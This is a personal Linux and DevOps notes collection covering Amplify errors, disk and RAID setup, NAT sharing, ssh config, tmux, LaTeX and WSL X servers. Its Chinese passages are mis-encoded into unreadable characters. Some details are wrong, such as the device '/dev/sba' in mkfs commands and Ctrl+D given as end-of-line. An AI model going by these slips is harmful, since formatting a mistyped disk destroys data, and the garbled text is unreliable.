<pre><code class="language-shell">UPDATE_FAILED auth&lt;appName&gt; AWS::CloudFormation::Stack &lt;TIME&gt; Parameters: [webClientId, nativeClientId, userPoolId] do not exist in the template
</code></pre>
<p>é‡æ–°é˜…è¯»ä¸Šé¢æåˆ°çš„ issueï¼Œåœ¨å¯¹è¯é‡Œç¿»å‡º <a href="https://github.com/aws-amplify/amplify-cli/issues/3798#issuecomment-852150899">è¿™ä¹ˆä¸€æ¡</a>ï¼šåŸå› æ˜¯åˆ‡æ¢ç¯å¢ƒä¹‹å <code>$HOME</code> directory ä¸‹ <code>.aws</code> çš„ global settings ä¸­ Amplify çš„ deployment-secrets.json æ²¡æœ‰æ­£ç¡® fetch åˆ°ã€‚è¿™åˆæ˜¯ <code>@aws-amplify/cli</code> æ›´æ–°åˆ°æ–°ç‰ˆæœ¬ä¹‹åçš„æ”¹åŠ¨â€¦â€¦</p>
<p>å“ã€‚æ— è¯­äº†ã€‚</p>
<p>åœ¨ <code>$HOME/.aws/amplify/deployment-secrets.json</code> ä¸­æŠŠå¯¹åº”ç¤¾äº¤å¹³å°çš„ <code>[ProvidersCustomResourceInputs]</code> çš„ <code>clientID</code> å’Œ <code>clientSecrets</code> å¡«å¥½ï¼ˆå“ªæ€•æ˜¯ dummy ID &amp; secrets ä¹Ÿè¡Œå¾—é€šï¼Œåªè¦ä¸æ˜¯ç©ºçš„ï¼‰ï¼Œå°±èƒ½æ­£å¸¸ deploy äº†ã€‚</p>
<p>æ€»ç»“ï¼š</p>
<ol>
<li>çœŸçš„ä¸è¦éšä¾¿å‡çº§ amplify cli</li>
<li>åˆ›å»º resource ä¸€å®šè¦åœ¨æœ¬åœ°ï¼Œæ”¹åŠ¨åˆ™ä¸è¦åœ¨æœ¬åœ°ï¼Œè¦åœ¨ web consoleâ€¦â€¦</li>
</ol>
<h2 id="debug-amplify-admin-ui"><a class="header" href="#debug-amplify-admin-ui">Debug Amplify admin UI</a></h2>
<p>If you ever encounter any error in your Amplify Admin UI, it's useful to open the debug view in your browser and checkout the console.</p>
<p><img src="devops/img/2021-11-17-15-34-54.png" alt="Amplify Admin UI error" /></p>
<p>In Chrome just press <code>F12</code>. There will be some usefull messages concerning what is wrong when Amplify tried to send request to the components in your app.</p>
<p><img src="devops/img/2021-11-17-15-36-54.png" alt="Browser Debug Console" /></p>
<p>Here I have some Uncaught error in one of the items in my DynamoDB...</p>
<h2 id="amplify-76x-graphql-api-migration"><a class="header" href="#amplify-76x-graphql-api-migration">Amplify 7.6.x graphql api migration</a></h2>
<p>Update from <strong>7.5.x</strong> to <strong>7.6.x</strong> will break the models created before since they <code>Amplify</code> team introduced new directives.</p>
<p>Run the follwing command to migrate API.</p>
<pre><code class="language-shell">$ amplify migrate api
</code></pre>
<p>Previously you would have to create a â€œjoin tableâ€ manually between two models and create <code>hasMany</code> relationships from both models into that join table as a work around for this feature. <em>With the new transformer</em>, you can specify a <code>@manyToMany</code> relationship between the models and <code>Amplify</code> CLI will create the join tables behind the scenes.</p>
<p>However, currently (01/01/2022) AWS <code>Amplify</code> <strong>DOES NOT</strong> successfully support migration of existing joint table.</p>
<p>If you have a <code>schema.graphql</code> like this:</p>
<pre><code class="language-graphql">type Student @model @auth(rules: [{allow: private}]) {
  id: ID!
  email: AWSEmail
  email_verified: Boolean
  name: String
  profile: ID
  role: String
  ClassJoined: [StudentClass] @hasMany(indexName: &quot;byStudent&quot;, fields: [&quot;id&quot;])
  ArtWorks: [ArtWork] @hasMany(indexName: &quot;byStudent&quot;, fields: [&quot;id&quot;])
  Comments: [Comment] @hasMany(indexName: &quot;byStudent&quot;, fields: [&quot;id&quot;])
}

type Class @model @auth(rules: [{allow: private}]) {
  id: ID!
  name: String!
  description: String!
  ...
  startDate: AWSDateTime
  students: [StudentClass] @hasMany(indexName: &quot;byClass&quot;, fields: [&quot;id&quot;])
  teacherID: ID @index(name: &quot;byTeacher&quot;)
}

type StudentClass @model(queries: null) @auth(rules: [{allow: private}]) {
  id: ID!
  studentID: ID! @index(name: &quot;byStudent&quot;, sortKeyFields: [&quot;classID&quot;])
  classID: ID! @index(name: &quot;byClass&quot;, sortKeyFields: [&quot;studentID&quot;])
  student: Student! @belongsTo(fields: [&quot;studentID&quot;])
  class: Class! @belongsTo(fields: [&quot;classID&quot;])
}
</code></pre>
<p>Unfortunately we have two <code>@index</code>, and <code>Amplify</code> fails to find the second (here <code>byClass</code>).</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="disk-management"><a class="header" href="#disk-management">Disk Management</a></h1>
<h2 id="normal-disk-operations"><a class="header" href="#normal-disk-operations">Normal Disk Operations</a></h2>
<h3 id="add-a-disk"><a class="header" href="#add-a-disk">Add a disk</a></h3>
<p>List the disk currently have in hand.
Or just <code>lsblk</code> will also do.</p>
<pre><code class="language-shell">$ lsblk -o NAME,SIZE,FSTYPE,TYPE,MOUNTPOINT
NAME         SIZE FSTYPE            TYPE  MOUNTPOINT
sda          256G                   disk
sdb          256G                   disk /
</code></pre>
<p>Format new disks.</p>
<pre><code class="language-shell">$ mkfs -t ext4 /dev/sba
$ mkfs.ext4 /dev/sba
</code></pre>
<p>Mount the formatted disk to certain directory.</p>
<pre><code class="language-shell">$ mount /dev/sba /mnt/sba
</code></pre>
<p>Add to <code>/etc/fstab</code> so that you don't need to mount it every time the device boots (how does it work?).</p>
<pre><code class="language-shell">$ sudo bash -c 'echo &quot;/dev/sba /mnt/sba ext4 defaults 0 0&quot; &gt;&gt; /etc/fstab
</code></pre>
<p>Or use UUID.</p>
<pre><code class="language-shell">$ UUID=$(sudo blkid | grep /dev/sba | cut -f2 -d ' ' | sed -e 's/\&quot;//g')
$ sudo bash -c 'echo &quot;${UUID} /mnt/sba ext4 defaults 0 0&quot; &gt;&gt; /etc/fstab'
</code></pre>
<p>Or add a label to the disk and use the label to mount.</p>
<pre><code class="language-shell">$ sudo e2label /dev/sba DISK1
sudo bash -c 'echo &quot;LABEL=DISK1 /mnt/sba ext4 defaults 0 0&quot; &gt;&gt; /etc/fstab'
</code></pre>
<h3 id="optimize-disk-performance"><a class="header" href="#optimize-disk-performance">Optimize disk performance</a></h3>
<p>Adjust the readahead value to increase IO performance</p>
<pre><code class="language-shell">$ sudo blockdev /dev/sba
256
</code></pre>
<p>The readahead value is <code>&lt;desired_readahead_bytes&gt;</code> / 512 bytes.</p>
<p>For example, for an 8-MB readahead, 8 MB is 8388608 bytes (<code>8 * 1024 * 1024</code>).</p>
<pre><code class="language-text">8388608 bytes / 512 bytes = 16384
</code></pre>
<p>Set blockdev to <code>16384</code> to havea 8-MB readahead.</p>
<pre><code class="language-shell">sudo blockdev --setra 16384 /dev/sba
</code></pre>
<h2 id="raid-operations"><a class="header" href="#raid-operations">RAID Operations</a></h2>
<p>The best option to make a software RAID array is <code>mdadm</code>. You can get it from <code>apt</code> or other package manager.</p>
<pre><code class="language-bash">$ sudo apt install mdadm
</code></pre>
<h3 id="normal-operations"><a class="header" href="#normal-operations">Normal operations</a></h3>
<p>Check RAID configuration</p>
<pre><code class="language-bash">$ sudo mdadm --detail --scan
</code></pre>
<p>Check RAID operation progress / whether there is already a RAID array available</p>
<pre><code class="language-bash">$ cat /proc/mdstat
Personalities : [linear] [multipath] [raid0] [raid1] [raid6] [raid5] [raid4] [raid10]
md0 : active raid5 nvme5n1[0] nvme7n1[2] nvme6n1[1] nvme8n1[4] nvme9n1[5]
      60011155456 blocks super 1.2 level 5, 512k chunk, algorithm 2 [5/5] [UUUUU]
      bitmap: 0/112 pages [0KB], 65536KB chunk

unused devices: &lt;none&gt;
</code></pre>
<h3 id="create-and-resize-a-raid-array"><a class="header" href="#create-and-resize-a-raid-array">Create and resize a RAID array</a></h3>
<p><strong>Create</strong> a RAID5 disk array called <code>/dev/md0</code> with <code>/dev/sda</code> <code>/dev/sdb</code> and <code>/dev/sdc</code> (might take quite some time)</p>
<p>Note that actually a RAID5 disk array can only be named in the form of <code>/dev/md[0-9]+</code></p>
<pre><code class="language-bash">$ sudo mdadm --create --verbose /dev/md0 \
  --level=5 --raid-devices=3 /dev/sda /dev/sdb /dev/sdc
</code></pre>
<p><strong>Grow</strong> a RAID5 disk array <code>/dev/md0</code> with 1 new disk called <code>/dev/sdd</code> (might take quite some time)</p>
<pre><code class="language-bash">$ sudo mdadm --add /dev/md0 /dev/sdd
$ mdadm --grow --raid-devices=5 /dev/md0
</code></pre>
<h2 id="reference-2"><a class="header" href="#reference-2">Reference</a></h2>
<ol>
<li><a href="https://cloud.google.com/compute/docs/disks/optimizing-pd-performance#adjust_the_readahead_value">Google Cloud Docs: Optimizing persistent disk performance</a></li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ubuntu-1804-internet-connection-sharing"><a class="header" href="#ubuntu-1804-internet-connection-sharing">Ubuntu 18.04 Internet Connection Sharing</a></h1>
<p>Our school has some weird regulations that each lab can only get 1 internet LAN cable assigned. But our lab has multiple servers and all of them need internet connection. So I (as the server manager) decided to set up internet connection sharing.</p>
<h2 id="requirements"><a class="header" href="#requirements">Requirements</a></h2>
<p>A <strong>gateway server</strong> with <strong>2</strong> <strong>N</strong>etwork <strong>I</strong>nterface <strong>C</strong>ard (<strong>NIC</strong>)s, <code>eth0</code>), connects to the internet,  <code>eth1</code> connects and manages the internal network.</p>
<p>The netplan configuration looks as follows:</p>
<pre><code class="language-yaml">eth0:
    addresses: [&lt;some ip&gt;/24]
    gateway4: &lt;some gateway&gt;
    nameservers:
        addresses: [8.8.8.8,8.8.4.4] # important!
    dhcp4: no
    dhcp6: no
eth1:
    address: [10.0.0.101/24]
    dhcp4: no
    dhcp6: no
</code></pre>
<p><code>eth1</code> can have whatever address falls in private IP subnet.</p>
<h2 id="gateway-setup"><a class="header" href="#gateway-setup">Gateway setup</a></h2>
<h3 id="enable-ip-forwarding"><a class="header" href="#enable-ip-forwarding">Enable IP forwarding</a></h3>
<p>Execute the following command</p>
<pre><code class="language-bash">sudo sh -c &quot;echo 1 &gt; /proc/sys/net/ipv4/ip_forward&quot;
</code></pre>
<p>Also edit <code>/etc/sysctl.conf</code> by uncommenting this line</p>
<pre><code class="language-text">#net.ipv4.ip_forward=1
</code></pre>
<h3 id="set-up-nat-rules"><a class="header" href="#set-up-nat-rules">Set up NAT rules</a></h3>
<pre><code class="language-bash">sudo iptables -A FORWARD -o eth0 -i eth1 -s 10.0.0.0/24 -m conntrack --ctstate NEW -j ACCEPT
sudo iptables -A FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -t nat -F POSTROUTING
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
</code></pre>
<p>The first rule allows forwarded packets (initial ones). The second rule allows forwarding of established connection packets (and those related to ones that started). The third rule does the NAT.</p>
<h3 id="automatic-setup"><a class="header" href="#automatic-setup">Automatic setup</a></h3>
<p>Save the iptables:</p>
<pre><code class="language-bash">sudo iptables-save | sudo tee /etc/iptables.sav
</code></pre>
<p>Edit <code>/etc/rc.local</code> and add the following lines before the <code>exit 0</code> line</p>
<pre><code class="language-bash">iptables-restore &lt; /etc/iptables.sav
</code></pre>
<h2 id="client-setup"><a class="header" href="#client-setup">Client setup</a></h2>
<p>Open <code>/etc/netplan/whatevername.yaml</code> and edit it</p>
<pre><code class="language-yaml">eth0:
    address: [10.0.0.102/24]
    gateway: 10.0.0.101 # important!
    nameservers:
        addresses: [8.8.8.8,8.8.4.4] # important!
</code></pre>
<p>It is very important that:</p>
<ol>
<li><code>gateway</code> address is the intranet IP of the gateway computer</li>
<li><code>nameservers</code> should use the same ones as the gateway computer</li>
</ol>
<p>Once editted, run the fllowing command</p>
<pre><code class="language-bash">sudo netplan apply
</code></pre>
<p>And then you can check the internet connetion by <code>ping</code>ing some famous websites</p>
<pre><code class="language-bash">$ ping www.google.com
PING www.google.com (172.217.27.68) 56(84) bytes of data.
64 bytes from nrt12s15-in-f68.1e100.net (172.217.27.68): icmp_seq=1 ttl=112 time=36.3 ms
64 bytes from nrt12s15-in-f68.1e100.net (172.217.27.68): icmp_seq=2 ttl=112 time=89.8 ms
64 bytes from nrt12s15-in-f68.1e100.net (172.217.27.68): icmp_seq=3 ttl=112 time=58.2 ms
...
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ssh-config"><a class="header" href="#ssh-config">ssh config</a></h1>
<ul>
<li><code>$HOME/.ssh/config</code> -- personal configuration</li>
<li><code>/etc/ssh/ssh_config</code> -- global configuration</li>
</ul>
<p>Format:</p>
<pre><code class="language-yaml">Host &lt;alias&gt;
    SSH_OPTION  value
</code></pre>
<h2 id="common-options"><a class="header" href="#common-options">Common options</a></h2>
<pre><code class="language-yaml">Host * # match all hosts
    User matchy
    IdentityFile $HOME/.ssh/id_ed25519

Host cloud
    HostName dev.example.com
    # automatically use &quot;matchy&quot; as the User
    # automatically use id_ed25519 as the IdentityFile

Host dev
    HostName 147.47.233.45
    User mischa # overwrites User=&quot;matchy&quot;
    Port 2333
    IdentityFile $HOME/.ssh/id_rsa # overwrites
</code></pre>
<h2 id="jumpbastion-server-make-easy"><a class="header" href="#jumpbastion-server-make-easy">Jump/Bastion server make-easy</a></h2>
<p><code>ProxyJump</code> is available since <strong>OpenSSH version 7.5</strong>.</p>
<pre><code class="language-diff"> Host bastion
     HostName transfer.example.com
     User matchy
     IdentityFile ~/.ssh/id_ed25519

 Host node
     HostName 192.168.50.233 # the intranet IP to the bastion
+    ForwardAgent yes
+    ProxyJump bastion
</code></pre>
<p>If your <code>ssh</code> is olderthan <strong>OpenSSH 7.5</strong> but newer than <strong>OpenSSH 5.4</strong> (assuming <code>bastion</code> config exists in the ssh config):</p>
<pre><code class="language-diff"> Host node
     # ...
+    ProxyCommand ssh bastion -W [%h]:%p
</code></pre>
<p>If your <code>ssh</code> is even older than <code>OpenSSH 5.4</code>...</p>
<pre><code class="language-diff"> Host node
     # ...
+    ProxyCommand ssh bastion nc -q0 %h %p 2&gt; /dev/null
</code></pre>
<h2 id="change-starting-directory"><a class="header" href="#change-starting-directory">Change starting directory</a></h2>
<p><code>RemoteCommand</code> is available since <strong>OpenSSH version 7.5</strong>.</p>
<pre><code class="language-diff"> Host node
     # ...
+    RequestTTY force
+    RemoteCommand cd /path/to/your/directory &amp;&amp; bash -l
</code></pre>
<p>The command <code>bash -l</code> means starting a <code>bash</code> session as the login shell. Alternatively, if you prefer <code>zsh</code> or <code>fish</code> (or any other shells), simply use <code>zsh -l</code> or <code>fish -l</code> instead.</p>
<h2 id="to-dos"><a class="header" href="#to-dos">To Dos</a></h2>
<ul>
<li><input disabled="" type="checkbox"/>
Avoid <code>broken pipe</code></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="effective-shell"><a class="header" href="#effective-shell">Effective Shell</a></h1>
<h2 id="navigating-along-the-command-line"><a class="header" href="#navigating-along-the-command-line">Navigating along the command line</a></h2>
<p>å¯èƒ½åº”è¯¥å½•åˆ¶ä¸€ä¸ª gif æ¥å±•ç¤ºåŠŸèƒ½ã€‚</p>
<table><thead><tr><th>åŠŸèƒ½</th><th>å¿«æ·é”®</th></tr></thead><tbody>
<tr><td>å®šä½åˆ°è¡Œå¼€å¤´</td><td><code>Ctrl</code> + <code>A</code> æˆ–è€… <code>Home</code></td></tr>
<tr><td>å®šä½åˆ°è¡Œæœ«å°¾</td><td><code>Ctrl</code> + <code>D</code> æˆ–è€… <code>End</code></td></tr>
<tr><td>å‘å‰ï¼ˆè¡Œé¦–ï¼‰ç§»åŠ¨<br>ä¸€ä¸ªè¯</td><td><code>Alt</code> + <code>B</code> æˆ–è€… <code>Ctrl</code> + â¬…</td></tr>
<tr><td>å‘åï¼ˆè¡Œæœ«ï¼‰ç§»åŠ¨<br>ä¸€ä¸ªè¯</td><td><code>Alt</code> + <code>F</code> æˆ–è€… <code>Ctrl</code> + â¡</td></tr>
<tr><td>åˆ é™¤æ•´è¡Œï¼ˆ<code>zsh</code>ï¼‰</td><td><code>Ctrl</code> + <code>U</code></td></tr>
<tr><td>åˆ é™¤å…‰æ ‡å¤„åˆ°è¡Œé¦–çš„<br>æ‰€æœ‰å­—ç¬¦ï¼ˆé <code>zsh</code>ï¼‰</td><td><code>Ctrl</code> + <code>U</code></td></tr>
<tr><td>åˆ é™¤å…‰æ ‡å¤„åˆ°è¡Œæœ«çš„<br>æ‰€æœ‰å­—ç¬¦</td><td><code>Ctrl</code> + <code>K</code></td></tr>
<tr><td>åˆ é™¤ä¸€ä¸ªè¯</td><td><code>Ctrl</code> + <code>W</code> æˆ–è€… <code>Alt</code> + <code>D</code></td></tr>
<tr><td>ä¸Šä¸€æ¡å‘½ä»¤</td><td><code>Ctrl</code> + <code>P</code> æˆ–è€… â¬†</td></tr>
<tr><td>ä¸‹ä¸€æ¡å‘½ä»¤</td><td><code>Ctrl</code> + <code>N</code> æˆ–è€… â¬‡</td></tr>
<tr><td>æ‰“å¼€ç¼–è¾‘å™¨ç¼–è¾‘å½“å‰<br>æŒ‡ä»¤</td><td><code>Ctrl</code> + <code>X</code>, <code>E</code></td></tr>
</tbody></table>
<p><code>Ctrl</code> + <code>X</code>,<code>E</code> æ‰“å¼€çš„ç¼–è¾‘å™¨æ˜¯é€šè¿‡ç¯å¢ƒå˜é‡ <code>$EDITOR</code> æŒ‡å®šçš„ã€‚</p>
<p>è¿™é‡Œæœ‰ä¸€å¼ éå¸¸æ£’çš„å›¾å¯ä½œæ€»ç»“ï¼š</p>
<p><img src="Terminal/img/2020-11-11-23-27-58.png" alt="Navigating the Command Line" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="random-bash-tips"><a class="header" href="#random-bash-tips">Random bash tips</a></h1>
<h2 id="mv"><a class="header" href="#mv"><code>mv</code></a></h2>
<p>The following command will not work</p>
<pre><code class="language-bash">mv &quot;${dir}/*.txt&quot; &quot;${dir}/another_place&quot;
</code></pre>
<p><code>*</code> will not be expanded inside quotation marks. To make it work, <code>*</code> should be
put outside the quote.</p>
<pre><code class="language-bash">mv &quot;${dir}/&quot;*&quot;.txt&quot; &quot;${dir}/another_place&quot;
</code></pre>
<blockquote>
<p>Should have more explanation on wildcards and globs</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h1 id="tmux-usage-101"><a class="header" href="#tmux-usage-101"><code>tmux</code> usage 101</a></h1>
<h2 id="motivation-why-you-should-use-tmux"><a class="header" href="#motivation-why-you-should-use-tmux">Motivation: why you should use <code>tmux</code>?</a></h2>
<p><code>tmux</code> is very useful under the following scenarios:</p>
<ol>
<li>When you <code>ssh</code> to a server, you would like to open multiple shells but don't want to <code>ssh</code> for multiple times.</li>
<li>When you want to leave your work on the server running without needing to keep your shell alive, and moreover, you want to resume working on it afterwards</li>
</ol>
<p>And it's just cool when you can split the shells windows!</p>
<h2 id="basic-usage"><a class="header" href="#basic-usage">Basic Usage</a></h2>
<p>All the commands for <code>tmux</code> are only available after you type the command prefix. By default it is <code>Ctrl</code>-<code>b</code>. After pressing this combination, it will activate the console mode (or so I believe).</p>
<h3 id="pane-commands"><a class="header" href="#pane-commands">Pane commands</a></h3>
<table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody>
<tr><td><code>&quot;</code></td><td>Split current pane <em>vertically</em>, create new pane <em>underneath</em></td></tr>
<tr><td><code>%</code></td><td>Split current pane <em>horizontally</em>, create new pane on the <em>right</em></td></tr>
<tr><td><code>x</code></td><td>Close current pane (with confirmation, contrasst to simply pressing <code>Ctrl</code>-<code>d</code>)</td></tr>
<tr><td><code>z</code></td><td>Maximize current pane (after <code>v1.8</code>)</td></tr>
<tr><td><code>!</code></td><td>Move current pane to a new window and open it there</td></tr>
<tr><td><code>;</code></td><td>Switch to the latest used pane</td></tr>
<tr><td><code>q</code></td><td>Show pane number, and before the numbers disappear, you can switch to that pane by typing the number</td></tr>
<tr><td><code>{</code></td><td>Swap forward current pane</td></tr>
<tr><td><code>}</code></td><td>Swap backward current pane</td></tr>
<tr><td><code>Ctrl</code>+<code>o</code></td><td>Swap all the panes in current window clockwise</td></tr>
<tr><td><code>arrow</code></td><td>Move to the pane pointed by the arrow key (intuitive!)</td></tr>
<tr><td><code>o</code></td><td>Switch to the next (pane number order) pane</td></tr>
<tr><td><code>t</code></td><td>Show a clock :)</td></tr>
</tbody></table>
<h2 id="configure"><a class="header" href="#configure">Configure</a></h2>
<h3 id="change-command-prefix"><a class="header" href="#change-command-prefix">Change command prefix</a></h3>
<p>The default command prefix <code>Ctrl</code>-<code>b</code> is not a very good key binding: they are too far away! My choice is to change it to <code>Ctrl</code>-<code>a</code>, but it could be set to any keybinding you like.</p>
<p>We should use <code>Ctrl</code>-<code>b</code> and then type <code>:</code> to enter the command line mod and enter the following lines</p>
<pre><code class="language-bash">set -g prefix C-a
unbind C-b
bind C-a send-prefix
</code></pre>
<p>If you would like to set it permanently, it is wise to create a <code>~/.tmux.conf</code>, it functions just like your <code>.bashrc</code> and other dotfiles. If you</p>
<p>Since <code>tmux</code> 1.6, it is possible to set a second prefix by the following command:</p>
<pre><code class="language-bash">set -g prefix2 &lt;your-key-binding&gt;
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="general-latex-tricks"><a class="header" href="#general-latex-tricks">General LaTeX tricks</a></h1>
<p>ä¸€äº›æˆ‘è¿˜æ²¡æœ‰ç†Ÿç»ƒæŒæ¡çš„ \(\LaTeX\) æŠ€å·§</p>
<h2 id="åœ¨-math-environment-é‡Œ-format-å­—ä½“"><a class="header" href="#åœ¨-math-environment-é‡Œ-format-å­—ä½“">åœ¨ math environment é‡Œ format å­—ä½“</a></h2>
<h3 id="bold"><a class="header" href="#bold">Bold</a></h3>
<pre><code class="language-latex">% preamble
% ...

\usepackage{bm}

% ...
% end of preamble

\begin{document}
% ...

\[
    \bm{A}
\]

%...
\end{document}
</code></pre>
<pre><code class="language-latex">\begin{document}
% ...

\[
    \bm{A}
\]

%...
\end{document}
</code></pre>
<h2 id="insert-pdf-pages-in-a-latex-file"><a class="header" href="#insert-pdf-pages-in-a-latex-file">Insert pdf pages in a \(\LaTeX\) file</a></h2>
<p>å¯¹äºåš take-home exam æœ‰å¥‡æ•ˆã€‚</p>
<pre><code class="language-latex">% preamble
% ...

\usepackage{pdfpages}

% ...
% end of preamble

\begin{document}
% ...

% include all pages
\includepdf[pages=-]{pdfname1.pdf}

% include certain pages (here 1, 3, 5)
\includepdf[page={1,3,5}]{pdfname2.pdf}

%...
\end{document}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="åœ¨-windows-10-ä¸Šè£…-x"><a class="header" href="#åœ¨-windows-10-ä¸Šè£…-x">åœ¨ Windows 10 ä¸Šè£… X</a></h1>
<h2 id="åŸºæœ¬é…ç½®"><a class="header" href="#åŸºæœ¬é…ç½®">åŸºæœ¬é…ç½®</a></h2>
<h3 id="windows-è®¾ç½®å®‰è£…-xserver"><a class="header" href="#windows-è®¾ç½®å®‰è£…-xserver">Windows è®¾ç½®ï¼šå®‰è£… Xserver</a></h3>
<p>å…¶å®å®‰è£…ä¸ª Xserver æŒºç®€å•çš„ã€‚</p>
<p>Windows ä¸Šçš„ Xserver æœ‰å¥½å‡ ä¸ªé€‰æ‹©ï¼Œæˆ‘ç”¨çš„æ˜¯ <a href="https://sourceforge.net/projects/vcxsrv/">VcXsrv</a>ã€‚å¦‚æœä½ ç”¨ <a href="https://chocolatey.org/">choco</a>ï¼Œè¿˜èƒ½æ›´æ–¹ä¾¿ï¼Œå¯ä»¥ç›´æ¥ <code>choco install vcxsrv</code>ã€‚ å¯çˆ±å¼ºå¼ºåˆå¯Œæœ‰çš„<a href="https://github.com/FluorineDog">ç‹—å“¥</a>æ¨èäº†å¾®è½¯åº”ç”¨å•†åº—çš„ <a href="https://x410.dev/">X410</a>ï¼Œçœ‹èµ·æ¥å’Œ Windows 10 æ•´åˆå¾—å¾ˆä¼˜ç§€ï¼Œä¸è¿‡çœŸçš„å¥½è´µå•Šâ€¦â€¦</p>
<p>ç„¶åæ˜¯ HiDPI è®¾ç½®ï¼Œä¸€èˆ¬é€šè¿‡è½»è–„æœ¬ç°åœ¨åº”è¯¥éƒ½è‡³å°‘æ˜¯ 2K æˆ– 3K å±å¹•äº†ã€‚ä¸è®¾ç½®ä¸€ä¸‹çš„è¯å­—ä½“ä¼šç³Šã€‚</p>
<p>é¦–å…ˆæ‰¾åˆ°è½¯ä»¶çš„å®‰è£…è·¯å¾„ï¼Œæ¯”å¦‚ <code>C:\Program Files\VcXsrv</code>ï¼Œç„¶åå¯¹ä¸¤ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ vcxsrv.exe å’Œ xlaunch.exe æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š</p>
<ol>
<li>å³é”®ç‚¹å‡»å¯æ‰§è¡Œæ–‡ä»¶</li>
<li>è¿›å…¥ <code>Properties -&gt; Compatibility -&gt; Change high DPI settings -&gt; High DPI scaling override</code></li>
<li>é€‰ä¸­ <code>Override high DPI scaling behavior</code></li>
<li>å°† Scaling performed by é€‰é¡¹è®¾ä¸º Application</li>
</ol>
<p><img src="misc/img/2020-11-11-16-52-53.png" alt="vcsrv HiDPI setting" /></p>
<p>åœ¨å¼€å§‹èœå•æŸ¥æ‰¾ XLaunch å¹¶è¿è¡Œï¼Œä¸€è·¯é»˜è®¤å°±å¯ä»¥å¼€å¯ Xserverã€‚å¦‚æœæ˜¯ WSL2ï¼Œè®°å¾—è¿˜è¦å…³é—­ access controlã€‚ç”¨å‘½ä»¤è¡Œçš„è¯å°±æ˜¯æ·»åŠ  <code>-ac</code> é€‰é¡¹ã€‚</p>
<h3 id="wsl-è®¾ç½®"><a class="header" href="#wsl-è®¾ç½®">WSL è®¾ç½®</a></h3>
<p>é¦–å…ˆè®¾ç½® <code>DISPLAY</code> ç¯å¢ƒå˜é‡ã€‚ WSL1 å¯ä»¥ <code>export DISPLAY=localhost:0.0</code> ï¼Œ WSL2 å°±è¦æŒ‡å®š IP äº†ã€‚ å¯ä»¥è¿™æ ·ä¸€åŠ³æ°¸é€¸ï¼š</p>
<pre><code class="language-bash">export DISPLAY=$(awk '/nameserver / {print $2; exit}' /etc/resolv.conf 2&gt;/dev/null):0
</code></pre>
<p>è¿™é‡Œä¹Ÿè®¾ç½®äº†ä¸€ä¸‹ <code>LIBGL_ALWAYS_INDIRECT</code>ï¼Œè™½ç„¶çªç›®å‰å¥½åƒä¹Ÿæ²¡ä»€ä¹ˆ 3D rendering éœ€è¦â€¦â€¦</p>
<pre><code class="language-bash">export LIBGL_ALWAYS_INDIRECT=1
</code></pre>
<p>ç„¶åæ˜¯ WSL æ–¹é¢çš„ HiDPI æ˜¾ç¤ºè®¾ç½®ï¼Œå½“ç„¶æ˜¯æœ‰å¤šç§è§£å†³æ–¹æ¡ˆçš„ã€‚å‚è€ƒ <a href="https://wiki.archlinux.org/index.php/HiDPI">Arch Linux wiki æœ‰å…³ HiDPI çš„é¡µé¢</a> ï¼ˆå†™å¾—è¶…çº§æ£’ï¼ï¼‰ï¼Œæ„Ÿè§‰è®¾ç½® GTKï¼ˆGDKï¼‰çš„ç¯å¢ƒå˜é‡æ˜¯æœ€æ³›ç”¨çš„ã€‚</p>
<p>æˆ‘çš„æ–¹æ¡ˆï¼š</p>
<pre><code class="language-bash">export GDK_SCALE=1
export GDK_DPI_SCALE=1.5
</code></pre>
<p>è¿™ä¸ªæ•°å€¼åœ¨å°æ–° Pro 13 çš„ 2K å±å¹•ä¸Šå¯¹äºå¤§å¤šæ•°åº”ç”¨æ•ˆæœéƒ½ä¸é”™ã€‚ä¸è¿‡ JB å®¶çš„ IntelliJ IDEA å’Œ CLion å› ä¸ºæ˜¯ Swing åº”ç”¨ï¼Œ UI scale åªæ”¯æ´æ•´æ•°å€ï¼Œ1.5 ä¼¼ä¹ç›¸å½“äº scale åˆ° 2 äº†ï¼Œå¯¼è‡´å­—éƒ½çœ‹èµ·æ¥éå¸¸å¤§â€¦â€¦ä¸è¿‡å¯ä»¥é€šè¿‡è°ƒæ•´å­—ä½“å¤§å°è§£å†³ã€‚</p>
<p>è¿™ä¸ªè¡¨æ ¼å¤§è‡´æ•´ç†äº†åº”è¯¥ä¿®æ”¹å“ªäº›åœ°æ–¹ï¼ˆåŸºäº CLion 2020 çš„èœå•å±‚çº§ï¼‰ï¼š</p>
<table><thead><tr><th>è®¾ç½®é¡¹</th><th>ä½œç”¨</th></tr></thead><tbody>
<tr><td><code>Appearance &amp; Behavior &gt; Appearance &gt; Use Custom Font</code></td><td>è®¾ç½®ç»å¤§å¤šæ•° UI å­—ä½“</td></tr>
<tr><td><code>Editor &gt; Font</code> æˆ– <br> <code>Editor &gt; Color Scheme &gt; Color Scheme Font</code></td><td>è®¾ç½®ç¼–è¾‘å™¨ï¼ˆå†™ä»£ç çš„åŒºåŸŸï¼‰çš„å­—ä½“</td></tr>
<tr><td><code>Editor &gt; Color Scheme &gt; Console Font</code></td><td>è®¾ç½®å†…å»ºç»ˆç«¯ï¼ˆIntegrated Terminalï¼‰çš„å­—ä½“</td></tr>
</tbody></table>
<h3 id="å¤§åŠŸå‘Šæˆ"><a class="header" href="#å¤§åŠŸå‘Šæˆ">å¤§åŠŸå‘Šæˆï¼</a></h3>
<p>è®¾ç½®å¥½ <code>DISPLAY</code> å’Œ HiDPI æ”¯æ´å¹¶å¼€å¯ Xserver ä¹‹åå°±èƒ½è¿è¡Œ GUI åº”ç”¨äº†ã€‚</p>
<p>å¯ä»¥æ‹¿ <code>xeyes</code> æµ‹è¯•ä¸€ä¸‹ï¼š</p>
<pre><code class="language-bash">sudo apt install x11-apps
xeyes
</code></pre>
